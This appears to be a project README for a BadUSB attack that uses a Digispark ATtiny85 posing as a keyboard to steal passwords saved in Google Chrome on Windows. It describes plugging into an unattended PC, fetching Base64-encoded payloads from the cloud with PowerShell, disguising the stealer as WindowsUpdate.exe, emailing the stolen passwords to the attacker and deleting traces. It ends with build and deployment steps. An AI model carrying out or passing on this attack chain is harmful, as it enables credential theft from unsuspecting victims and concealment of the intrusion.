 This project demonstrates how USB keyboard emulation can be exploited using the Digispark ATtiny85 development board to swipe passwords saved in Google Chrome.

# Objectives: 
 * Minimize time for attacker to keep device plugged in
 * Fit initial exploit code onto limited flash memory on ATtiny85
 * Leave no traces behind after victim has been pwned
# Attack:
1. Victim plugs in unknown USB device with ATtiny and code implanted
2. Attack executes

**OR**

1. Victim leaves Windows computer unattended and unlocked to get some coffee
2. Attacker approaches with hotspot (Ex. 'attwifi') ***This is only necessary if there are browsing restrictions on the host network***
3. Attacker plugs in ATtiny via USB and waits for red LED signal.
4. Attacker unplugs device and flees the scene
5. Attack executes
# Software:
 
### payload.ino
* AtTiny84 emulates keyboard
* Uses WINDOWS + R shortcut to open run prompt and open cmd and powershell
* Connects to attackers wifi hotspot to bypass potential browsing restrictions
* Uses powershell to download and decode Base64 encoded file stored in cloud
* Runs decoded file (orion.bat)
* Turns on LED on ATtiny so attacker knows to unplug and skrrt

### orion.bat
* Attack continues after attacker leaves
* Writes and runs powershell script to download WindowsUpdate.exe from cloud
* Opens Microsoft Edge to hide ghost code execution from bystanders
* Decodes WindowsUpdate.exe from Base64
* Kills Chrome process so databases can be read
* Runs WindowsUpdate.exe
* deletes all files created previously to hide traces of tampering

### WindowsUpdate.py
* Uses chromepass https://github.com/hassaanaliw/chromepass to siphon passwords from Google Chrome. 
* Uses MIME library to email passwords to attacker securely

 ### Compiling Instructions:
 1. Update WindowsUpdate.py with valid email credentials.
 2. Use py2exe to compile into exe file (since most Windows PCs don't come with Python).
 3. In command prompt run: *certutil -encode WindowsUpdate.exe "certification.txt"*
 4. Upload certification.txt to cloud and replace link in orion.bat
 5. In command prompt run: *certutil -encode orion.bat "emerald.txt"*
 6. Upload emerald.txt to cloud and replace link in payload.ino
 7. Compile and upload payload.ino to ATtiny Device using Arduino IDE
